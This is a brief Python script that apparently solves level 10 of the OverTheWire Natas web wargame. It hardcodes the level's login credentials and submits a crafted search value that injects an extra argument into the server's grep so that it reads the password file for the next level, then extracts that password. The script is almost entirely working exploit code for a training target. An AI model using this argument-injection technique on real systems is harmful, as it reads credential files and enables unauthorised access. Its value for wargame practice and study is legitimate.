import requests
import re

usrname = 'natas10'
passwd = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'

url = "http://%s.natas.labs.overthewire.org/" % usrname

session = requests.Session()

#response = session.get(url, auth = (usrname, passwd))
response = session.post(url, data = {"needle" : ". ../../../../etc/natas_webpass/natas11 #", "submit" : "submit"}, auth = (usrname, passwd))
content = response.text

#print(content)

print re.findall('pre>\n(.*)\n</' , content)[0]
